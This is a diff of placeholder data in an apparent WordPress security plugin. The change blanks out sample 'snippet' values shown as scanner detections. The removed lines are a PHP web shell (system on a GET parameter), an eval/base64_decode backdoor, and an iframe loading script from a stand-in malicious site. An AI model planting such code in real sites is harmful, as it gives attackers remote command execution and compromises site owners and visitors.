@@ -98,7 +98,7 @@ class Bearmor_Placeholder {
 				'detected_at'  => date( 'Y-m-d H:i:s', strtotime( '-1 day' ) ),
 				'location'     => 'wp_posts.post_content (ID: 42)',
 				'threat_type'  => 'Malicious Script',
-				'snippet'      => '<iframe src="http://malicious-site.com/inject.js"></iframe>',
+				'snippet'      => '',
 				'severity'     => 'critical',
 			),
 			array(
@@ -106,7 +106,7 @@ class Bearmor_Placeholder {
 				'detected_at'  => date( 'Y-m-d H:i:s', strtotime( '-2 days' ) ),
 				'location'     => '/wp-content/uploads/2024/01/shell.php',
 				'threat_type'  => 'Web Shell',
-				'snippet'      => '<?php system($_GET["cmd"]); ?>',
+				'snippet'      => '',
 				'severity'     => 'critical',
 			),
 			array(
@@ -114,7 +114,7 @@ class Bearmor_Placeholder {
 				'detected_at'  => date( 'Y-m-d H:i:s', strtotime( '-3 days' ) ),
 				'location'     => 'wp_options.option_value',
 				'threat_type'  => 'Backdoor Code',
-				'snippet'      => 'eval(base64_decode($_POST["x"]));',
+				'snippet'      => '',
 				'severity'     => 'high',
 			),
 		);
